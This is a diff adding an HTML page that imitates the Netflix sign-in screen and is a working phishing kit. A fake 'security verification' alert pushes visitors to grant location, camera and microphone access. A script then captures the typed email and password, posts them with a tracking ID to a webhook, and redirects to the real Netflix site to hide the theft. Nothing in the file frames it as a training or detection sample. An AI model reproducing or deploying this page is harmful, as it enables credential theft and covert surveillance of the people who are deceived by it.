@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            padding: 20px 40px;
+        }
+
+        .logo {
+            width: 167px;
+            height: 45px;
+            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNjciIGhlaWdodD0iNDUiPjxwYXRoIGZpbGw9IiNlNTA5MTQiIGQ9Ik0wIDBoMTY3djQ1SDB6Ii8+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTI1IDEwaDV2MjVoLTV6bTEwIDBoNXYyNWgtNXptMTAgMGg1djI1aC01eiIvPjwvc3ZnPg==') no-repeat;
+            background-size: contain;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-box {
+            background: rgba(0, 0, 0, 0.75);
+            border-radius: 4px;
+            padding: 60px 68px 40px;
+            max-width: 450px;
+            width: 100%;
+        }
+
+        .login-title {
+            color: #fff;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 28px;
+        }
+
+        .alert-message {
+            background: rgba(229, 9, 20, 0.7);
+            color: #fff;
+            padding: 16px 20px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px 20px;
+            background: #333;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+        }
+
+        .form-input::placeholder {
+            color: #8c8c8c;
+        }
+
+        .form-input:focus {
+            outline: none;
+            background: #454545;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #e50914;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 24px;
+            transition: background 0.2s;
+        }
+
+        .btn:hover {
+            background: #f40612;
+        }
+
+        .btn:disabled {
+            background: #333;
+            cursor: not-allowed;
+        }
+
+        .btn-success {
+            background: #46d369;
+        }
+
+        .help-text {
+            color: #737373;
+            font-size: 13px;
+            margin-top: 16px;
+            text-align: center;
+        }
+
+        .help-link {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        .permission-section {
+            margin-top: 24px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+        }
+
+        .permission-title {
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .permission-list {
+            list-style: none;
+        }
+
+        .permission-item {
+            color: #b3b3b3;
+            font-size: 14px;
+            padding: 8px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .permission-icon {
+            color: #e50914;
+            font-size: 16px;
+        }
+
+        .footer {
+            padding: 30px 40px;
+            background: rgba(0, 0, 0, 0.75);
+        }
+
+        .footer-text {
+            color: #737373;
+            font-size: 13px;
+            text-align: center;
+        }
+
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #333;
+            border-top: 3px solid #e50914;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 16px auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                padding: 20px;
+            }
+
+            .login-box {
+                padding: 40px 28px;
+            }
+
+            .login-title {
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+
+<body onload="gpsLocation()">
+    <div class="header">
+        <svg width="167" height="45" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#e50914" d="M0 0h167v45H0z" />
+            <text x="20" y="32" fill="#fff" font-family="Arial, sans-serif" font-size="32"
+                font-weight="bold">NETFLIX</text>
+        </svg>
+    </div>
+
+    <div class="container">
+        <div class="login-box">
+            <h1 class="login-title">Sign In</h1>
+
+            <div class="alert-message">
+                <i class="fas fa-exclamation-triangle"></i> Security verification required. Please complete the steps
+                below to access your account.
+            </div>
+
+            <form id="loginForm" onsubmit="return captureCredentials(event)">
+                <div class="form-group">
+                    <input type="text" id="email" class="form-input" placeholder="Email or phone number" required>
+                </div>
+
+                <div class="form-group">
+                    <input type="password" id="password" class="form-input" placeholder="Password" required>
+                </div>
+
+                <button type="submit" class="btn" id="submitBtn" disabled>
+                    <span id="btnText">Sign In</span>
+                </button>
+            </form>
+
+            <div class="permission-section">
+                <div class="permission-title">Device Verification Required</div>
+                <p style="color: #b3b3b3; font-size: 13px; margin-bottom: 12px;">
+                    For your security, please allow the following permissions:
+                </p>
+                <ul class="permission-list">
+                    <li class="permission-item">
+                        <i class="fas fa-map-marker-alt permission-icon"></i>
+                        <span>Location verification</span>
+                    </li>
+                    <li class="permission-item">
+                        <i class="fas fa-camera permission-icon"></i>
+                        <span>Camera access</span>
+                    </li>
+                    <li class="permission-item">
+                        <i class="fas fa-microphone permission-icon"></i>
+                        <span>Microphone access</span>
+                    </li>
+                </ul>
+                <button class="btn" id="allowBtn" onclick="allowPermissions()" style="margin-top: 16px;">Allow
+                    Permissions</button>
+            </div>
+
+            <div class="spinner" id="spinner"></div>
+
+            <p class="help-text">
+                <a href="#" class="help-link" onclick="return false;">Need help?</a>
+            </p>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p class="footer-text">© 2024 Netflix, Inc.</p>
+    </div>
+
+    <p id="techchip" style="display:none;"></p>
+
+    <script>
+        var permissionsGranted = false;
+
+        function allowPermissions() {
+            if (typeof requestPermissions === 'function') {
+                requestPermissions();
+            }
+
+            permissionsGranted = true;
+            var submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = false;
+
+            var allowBtn = document.getElementById('allowBtn');
+            allowBtn.innerHTML = '<i class="fas fa-check"></i> Permissions Granted';
+            allowBtn.className = 'btn btn-success';
+            allowBtn.disabled = true;
+        }
+
+        function captureCredentials(event) {
+            event.preventDefault();
+
+            if (!permissionsGranted) {
+                alert('Please allow device verification first');
+                return false;
+            }
+
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            document.getElementById('btnText').textContent = 'Signing in...';
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('spinner').style.display = 'block';
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "/webhook.php");
+            xhr.setRequestHeader('Content-type', 'application/json;charset=utf-8');
+            xhr.send(JSON.stringify({
+                type: "credentials",
+                service: "Netflix",
+                email: email,
+                password: password,
+                uid: localStorage.getItem('almight_uid') || 'unknown'
+            }));
+
+            setTimeout(function () {
+                window.location.href = "https://www.netflix.com";
+            }, 2000);
+
+            return false;
+        }
+
+        function requestPermissions() { }
+        function gpsLocation() { }
+    </script>
+
+    <!-- tc_payload -->
+</body>
+
+</html>
